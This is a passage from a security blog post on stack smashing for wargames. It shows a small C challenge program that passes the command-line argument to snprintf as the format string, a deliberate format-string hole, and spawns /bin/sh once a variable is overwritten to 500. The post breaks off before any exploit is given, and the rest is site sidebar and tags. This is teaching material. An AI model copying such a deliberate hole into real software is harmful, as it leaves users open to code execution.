<span class="n">Foundation</span><span class="p">,</span> <span class="n">Inc</span><span class="p">.,</span> <span class="mi">51</span> <span class="n">Franklin</span> <span class="n">St</span><span class="p">,</span> <span class="n">Fifth</span> <span class="n">Floor</span><span class="p">,</span> <span class="n">Boston</span><span class="p">,</span> <span class="n">MA</span>  <span class="mo">02110</span><span class="o">-</span><span class="mi">1301</span>  <span class="n">USA</span>
</pre></div>


<p>*/</p>
<h1>include <stdio.h></h1>
<h1>include <stdlib.h></h1>
<h1>include <string.h></h1>
<p>int main(int argc, char **argv){
  int i = 1;
  char buffer[64];</p>
<p>snprintf(buffer, sizeof buffer, argv[1]);
  buffer[sizeof (buffer) - 1] = 0;
  printf("Change i's value from 1 -&gt; 500. ");</p>
<p>if(i==500){
    printf("GOOD\n");
    system("/bin/sh");
  }</p>
<p>printf("No way...let me give you a hint!\n");
  printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
  printf ("i = %d (%p)\n", i, &amp;i);
  return 0;
}
```</p>
<p>So this program</p>
                </div><!-- /.entry-content -->
                <div class="comments">
                <h2>Comments !</h2>
                        <div id="disqus_thread"></div>
                        <script type="text/javascript">
                           var disqus_identifier = "smashing-the-stack-for-fun-or-wargames.html";
                           (function() {
                                var dsq = document.createElement('script');
                                dsq.type = 'text/javascript'; dsq.async = true;
                                dsq.src = 'http://bt3gl.disqus.com/embed.js';
                                (document.getElementsByTagName('head')[0] ||
                                 document.getElementsByTagName('body')[0]).appendChild(dsq);
                          })();
                        </script>
                </div>
        </article>
</section>
        </div><!--/span-->

                <div class="span3 well sidebar-nav" id="sidebar">
<ul class="nav nav-list">



<li class="nav-header"><h4>Categories</h4></li>
<li>
<a href="http://bt3gl.github.io/category/vulnerabilities.html">
    <i class="icon-folder-open icon-large"></i>Vulnerabilities
</a>
</li>
<li>
<a href="http://bt3gl.github.io/category/reverse-engineering.html">
    <i class="icon-folder-open icon-large"></i>Reverse Engineering
</a>
</li>
<li>
<a href="http://bt3gl.github.io/category/networking.html">
    <i class="icon-folder-open icon-large"></i>Networking
</a>
</li>
<li>
<a href="http://bt3gl.github.io/category/life.html">
    <i class="icon-folder-open icon-large"></i>Life
</a>
</li>
<li>
<a href="http://bt3gl.github.io/category/forensics.html">
    <i class="icon-folder-open icon-large"></i>Forensics
</a>
</li>
<li>
<a href="http://bt3gl.github.io/category/cryptography.html">
    <i class="icon-folder-open icon-large"></i>Cryptography
</a>
</li>

<br>

<li class="nav-header"><h4>Tags</h4></li>
<ul class="tagcloud">
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/lamp.html">
        <i class="icon-tag icon-large"></i>LAMP
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/assembly.html">
        <i class="icon-tag icon-large"></i>Assembly
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/stack.html">
        <i class="icon-tag icon-large"></i>Stack
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/bash.html">
        <i class="icon-tag icon-large"></i>Bash
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/hashcat.html">
        <i class="icon-tag icon-large"></i>hashcat
    </a>
</li>
<li class="tag-1">
    <a href="http://bt3gl.github.io/tag/csaw.html">
        <i class="icon-tag icon-large"></i>CSAW
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/outguess.html">
        <i class="icon-tag icon-large"></i>OutGuess
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/gdb.html">
        <i class="icon-tag icon-large"></i>gdb
    </a>
</li>
<li class="tag-3">
    <a href="http://bt3gl.github.io/tag/pdf-parser.html">
        <i class="icon-tag icon-large"></i>pdf-parser
    </a>
</li>
<li class="tag-3">
    <a href="http://bt3gl.github.io/tag/wireshark.html">
        <i class="icon-tag icon-large"></i>Wireshark
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/nop.html">
        <i class="icon-tag icon-large"></i>NOP
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/pdftotext.html">
        <i class="icon-tag icon-large"></i>pdftotext
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/qpdf.html">
        <i class="icon-tag icon-large"></i>qpdf
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/chaosreader.html">
        <i class="icon-tag icon-large"></i>Chaosreader
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/uncompyle2.html">
        <i class="icon-tag icon-large"></i>uncompyle2
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/c.html">
        <i class="icon-tag icon-large"></i>C
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/command-injection.html">
        <i class="icon-tag icon-large"></i>Command Injection
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/overflow.html">
        <i class="icon-tag icon-large"></i>Overflow
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/vigenere.html">
        <i class="icon-tag icon-large"></i>Vigenere
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/.html">
        <i class="icon-tag icon-large"></i>
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/mem.html">
        <i class="icon-tag icon-large"></i>mem
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/ftp.html">
        <i class="icon-tag icon-large"></i>FTP
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/love.html">
        <i class="icon-tag icon-large"></i>Love
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/telnet.html">
        <i class="icon-tag icon-large"></i>telnet
    </a>
</li>
<li class="tag-1">
    <a href="http://bt3gl.github.io/tag/ctf.html">
        <i class="icon-tag icon-large"></i>CTF
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/steganography.html">
        <i class="icon-tag icon-large"></i>Steganography
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/jad.html">
        <i class="icon-tag icon-large"></i>jad
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/shellshock.html">
        <i class="icon-tag icon-large"></i>Shellshock
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/hope.html">
        <i class="icon-tag icon-large"></i>Hope
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/wargames.html">
        <i class="icon-tag icon-large"></i>Wargames
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/pygenere.html">
        <i class="icon-tag icon-large"></i>pygenere
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/javascript.html">
        <i class="icon-tag icon-large"></i>JavaScript
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/readelf.html">
        <i class="icon-tag icon-large"></i>readelf
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/buffer.html">
        <i class="icon-tag icon-large"></i>Buffer
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/rot13.html">
        <i class="icon-tag icon-large"></i>ROT13
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/socket.html">
        <i class="icon-tag icon-large"></i>socket
    </a>
</li>


</ul>

        </div><!--/.well -->

      </div><!--/row-->



      <footer>
        <address id="about">

        </address><!-- /#about -->

      </footer>

    </div><!--/.fluid-container-->


    <script src="http://bt3gl.github.io/theme/js/jquery-1.7.2.min.js"></script>
    <script src="http://bt3gl.github.io/theme/js/bootstrap.min.js"></script>
  </body>
</html>